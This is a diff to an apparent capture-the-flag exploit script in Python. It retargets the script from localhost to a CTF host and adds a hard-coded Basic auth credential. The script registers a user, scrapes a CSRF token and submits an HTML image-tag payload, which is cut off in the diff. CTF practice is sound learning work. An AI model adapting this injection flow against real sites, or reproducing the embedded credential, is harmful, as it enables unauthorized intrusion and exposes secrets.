@@ -7,6 +7,10 @@ s = requests.Session()
 username = str(uuid.uuid4()).replace('-', '')
 password = str(uuid.uuid4())
 
+headers = {
+    'Authorization': 'Basic emVuaGFjazozdjJZbmJBeXdmV1phYjNh',
+}
+
 reg_data = {
     'username': username,
     'password': password,
@@ -16,9 +20,9 @@ reg_data = {
 print("Username: %s\nPassword: %s" % (username, password))
 print()
 
-s.post('http://127.0.0.1:8080/registration.php', data=reg_data)
+s.post('http://render.ctf.emilionunes.it/registration.php', headers=headers, data=reg_data)
 
-new_page_text = s.get('http://127.0.0.1:8080/new_page.php').text
+new_page_text = s.get('http://render.ctf.emilionunes.it/new_page.php', headers=headers).text
 csrf_token = new_page_text.split('"csrf_token" value="')[1].split('"')[0]
 eploit = '''
 <img
@@ -34,5 +38,5 @@ page_data = {
     'csrf_token': csrf_token,
 }
 
-response = s.post('http://127.0.0.1:8080/new_page.php', data=page_data)
+response = s.post('http://render.ctf.emilionunes.it/new_page.php', headers=headers, data=page_data)
 print("Response: " + response.text.split('<div class="panel-heading">')[1].split('</div>')[0].strip())
